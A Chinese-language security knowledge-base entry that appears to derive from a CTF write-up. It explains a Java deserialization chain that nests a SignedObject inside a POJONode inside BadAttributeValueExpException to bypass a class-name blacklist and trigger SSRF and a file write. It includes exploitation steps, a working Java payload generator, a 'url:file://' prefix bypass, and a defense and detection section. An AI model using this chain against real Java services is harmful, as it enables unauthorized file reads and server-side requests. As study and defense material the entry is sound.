---
id: web-java-deser-bave-pojonode-signedobject-business-class-readobject-ssrf-filewrite
title: BAVE(val=POJONode(SignedObject(业务类))) 绕过 resolveClass 黑名单：把被封禁的自研类偷渡回内层流，触发其 readObject 里的 SSRF 拉文件落盘
type: scenario
domain: web
path: web/java/deserialization
technique: badattribute-pojonode-signedobject-smuggle-blacklisted-business-readobject
aliases:
- SignedObject 二次反序列化偷渡业务类
- BadAttributeValueExpException 触发 POJONode toString
- 反序列化 readObject 里的 SSRF 写文件
- url:file:// 绕过 file 前缀校验
- javassist 删除 BaseJsonNode.writeReplace
tags:
- java
- deserialization
- signedobject
- pojonode
- badattributevalueexp
- blacklist-bypass
- ssrf
- file-write
- jackson
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:36:10+08:00'
  notes: 已对照原文核对（2023 巅峰极客 BabyURL）：MyObjectInputStream 类名黑名单封 URLHelper/URLVisiter/CC、SignedObject 构造时序列化 content 且 getObject 内部新建原生 ObjectInputStream、POJONode.toString 经 InternalNodeMapper/ObjectMapper.writeValueAsString 调 getter、BAVE.readObject 调 val.toString、生成端用 javassist 删 BaseJsonNode.writeReplace、url:file:// 绕过 file 前缀校验、/file 路由回显 /tmp/file 均与正文一致；本次核对未读取图片，仅依据正文；未验证点为自研类 readObject 的具体代码只在正文转述而截图未读，且原文自评此链只是有机会成功、PoC 仅在作者本机跑通；原文只写 Spring Boot 2.7.3 与 Java 1.8 的目标环境，未标注受影响版本区间，故未填 affected_versions
---

## 一句话结论

入口用自定义 `ObjectInputStream` 按类名黑名单封掉了业务自研类（本例 `URLHelper`/`URLVisiter`）与 commons-collections，导致「直接反序列化业务类」和「常规 CC 链」都不可用；用 `java.security.SignedObject` 把被封禁的业务对象封进 `content` 后，再套 `POJONode` 与 `BadAttributeValueExpException`：`BAVE.readObject → val.toString() → POJONode.toString → Jackson 序列化 → SignedObject.getObject()` 会新起一个**普通** `ObjectInputStream` 反序列化内层，黑名单失效，业务类自己的 `readObject` 里的 HTTP 拉取/写文件逻辑随即执行，把远端内容（`url:file:///flag`）落到本地固定路径，再访问另一个读取路由取回。

## 原理

- **黑名单只作用于外层流**：自定义流重写 `resolveClass`，对 `java.net.InetAddress`、`org.apache.commons.collections.Transformer`/`functors`、`URLVisiter`、`URLHelper` 等做类名拦截。拦截发生在**当前这个流实例**的类解析阶段。
- **SignedObject 自带一个裸流**：`SignedObject` 构造时把任意 `Serializable` 序列化进 `content`；`getObject()` 内部执行 `new ObjectInputStream(new ByteArrayInputStream(content)).readObject()`——这是 JDK 原生流，不继承目标的黑名单子类，所以内层放什么都行，包括刚刚被封禁的业务类。
- **谁来调 getObject**：`SignedObject.getObject()` 是合法 getter。Jackson 的 `ObjectMapper.writeValueAsString(bean)` 会遍历 bean 的 getter 并调用，因此只要让 SignedObject 进入一次 Jackson 序列化即可。
- **怎么进入 Jackson 序列化**：`POJONode.toString()` 走 `BaseJsonNode.toString() → InternalNodeMapper.nodeToString() → ObjectMapper.writeValueAsString()`，把包裹的对象交给 Jackson。
- **谁来调 toString**：`BadAttributeValueExpException` 反序列化时（JDK8 及未做加固的版本）会把 `val` 字段做 `val.toString()` 拼进异常消息；把 `val` 反射改成 `POJONode` 即完成触发。JDK 高版本把该行为改成 `System.getSecurityManager()` 判断后需要换 `EventListenerList`/`XString` 等触发源。
- **payload 能序列化的前提**：`BaseJsonNode` 有 `writeReplace()`，序列化 `POJONode` 时会被替换成别的东西导致目标端拿不到 POJONode；生成端必须先用 javassist 删掉该类的方法（或在当前目录重写一个同名类），只影响生成端 JVM。
- **为什么最终危害不只是 SSRF**：内层业务类 `URLHelper.readObject` 主动调用 `URLVisiter.visitUrl(url)` 并把响应写进固定文件（本例 `/tmp/file`），站点另有 `/file` 路由回显该文件内容 —— 攻击者用一次反序列化完成了「服务端代为读取任意资源 + 落盘 + 回显」，即使没有命令执行也能取到 flag；而 `file://` 前缀校验可用 `url:file://` 绕过（JDK `URL` 构造器会剥离前导 `url:`）。

## 触发条件

- 存在 Java 原生反序列化入口，且入口用「类名前缀黑名单」而非 JEP 290/415 的白名单过滤器。
- 黑名单里封了业务自研类或常见 gadget（`TemplatesImpl`、commons-collections）导致常规链不可用。
- classpath 含 jackson-databind（提供 `POJONode`）与 JDK8/未加固 JDK（`BAVE` 仍会调 `toString`）。
- 未拦截 `java.security.SignedObject`、`com.fasterxml.jackson.databind.node.POJONode`、`javax.management.BadAttributeValueExpException`。
- 业务类自身存在「readObject 里发起网络请求/写文件」的副作用，且落地路径可被另一路由读取（否则只有 SSRF 原语可用）。

## 利用步骤

1. 逆向下发入口，读出黑名单实际内容与 `readObject` 后的强转类型，确定哪些类被封。
2. 找到被封但**自身有用**的业务类，读它的 `readObject`（本例 `URLHelper.readObject → URLVisiter.visitUrl(url) → 写入 /tmp/file`）。
3. 生成端用 javassist 删除 `com.fasterxml.jackson.databind.node.BaseJsonNode.writeReplace` 并 `toClass` 重载，保证 `POJONode` 能被正常序列化。
4. 构造内层对象：`new URLHelper("url:file:///flag")`，并给它注入 `URLVisiter`；用 DSA/RSA 私钥与 `Signature` 把它封进 `SignedObject`。
5. 构造 `POJONode(signedObject)`，再反射把 `BadAttributeValueExpException.val` 设为该 node。
6. 序列化后 Base64，提交到入口；服务端 `BAVE.readObject → toString → Jackson → getObject` 打开内层流，业务类 `readObject` 执行，文件落盘。
7. 访问站点的读取路由（本例 `/file`）取回内容。

## PoC

```java
// 生成端：内层业务类 → SignedObject → POJONode → BAVE
URLHelper helper = new URLHelper("url:file:///flag");   // file:// 被前缀校验挡，加 url: 绕过
helper.visiter = new URLVisiter();

// 必须先在生成端删掉 writeReplace，否则 POJONode 会被替换
CtClass jsonNode = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
jsonNode.removeMethod(jsonNode.getDeclaredMethod("writeReplace"));
jsonNode.toClass(Thread.currentThread().getContextClassLoader(), null);

KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
kpg.initialize(1024);
PrivateKey priv = kpg.generateKeyPair().getPrivate();
SignedObject so = new SignedObject(helper, priv, Signature.getInstance("DSA"));

POJONode node = new POJONode(so);
BadAttributeValueExpException bave = new BadAttributeValueExpException(null);
Field f = bave.getClass().getDeclaredField("val");
f.setAccessible(true);
f.set(bave, node);

ByteArrayOutputStream bos = new ByteArrayOutputStream();
try (ObjectOutputStream oos = new ObjectOutputStream(bos)) { oos.writeObject(bave); }
System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
```

```text
调用链：
BadAttributeValueExpException.readObject
  -> val.toString() -> POJONode.toString -> InternalNodeMapper.nodeToString
    -> ObjectMapper.writeValueAsString -> SignedObject.getObject()   // 原生 ObjectInputStream，无视外层黑名单
      -> URLHelper.readObject -> URLVisiter.visitUrl("url:file:///flag") -> 写入 /tmp/file
GET /file -> 回显 /tmp/file
```

## 变体与关联

- **换触发源**：JDK 高版本 `BAVE` 不再调用 `toString`，改用 `EventListenerList → UndoManager.toString → Vector.toString → POJONode.toString`，或用 `XString`/`HotSwappableTargetSource` 做 `HashMap` 冲突键。
- **双层 SignedObject**：若内层还要放被封禁的 `TemplatesImpl`，把「`BAVE(val=POJONode(TemplatesImpl))`」整个对象再封进一层 `SignedObject`，外层仍用 `BAVE(val=POJONode(SignedObject))`，两层都靠 `getObject` 进裸流。
- **sink 泛化**：任何「`readObject` 里有副作用」的业务类都可作为内层载荷（SSRF、写文件、连接池初始化、JNDI lookup），这正是本链比通用 TemplatesImpl 更有价值的地方。
- **同类原理**：`SignedObject`/`RMIConnector`/`Hessian` 二次反序列化都属「方法内部重建流」绕过类名黑名单；区别只在触发 getter 与外包载体。

## 检测与防御

- 不要用类名前缀黑名单：改用 `ObjectInputFilter` 白名单，并注册 `setSerialFilterFactory` 让**所有**新建流（含 `SignedObject.getObject` 内层）继承同一策略。
- 明确禁止 `java.security.SignedObject`、`BadAttributeValueExpException`、`POJONode`、`EventListenerList` 等载体类；升级 JDK 到 `BAVE` 不再调 `toString` 的版本。
- 业务侧：`readObject` 里不要做网络请求、不要写文件；对外部可达类型加 `readResolve`/`readObject` 校验。
- 检测：序列化流中出现 `SignedObject` 且 `content` 内含第二段 `AC ED 00 05`；`BAVE` + `POJONode` 组合；反序列化栈中出现 `ObjectMapper.writeValueAsString` 与嵌套 `ObjectInputStream.readObject`；固定路径文件（如 `/tmp/file`）在反序列化请求后被创建或改写。
- 出口侧：限制应用进程的出网与 `file:`/`url:` 协议访问，`/tmp` 挂 `noexec` 并对敏感读取路由加鉴权。
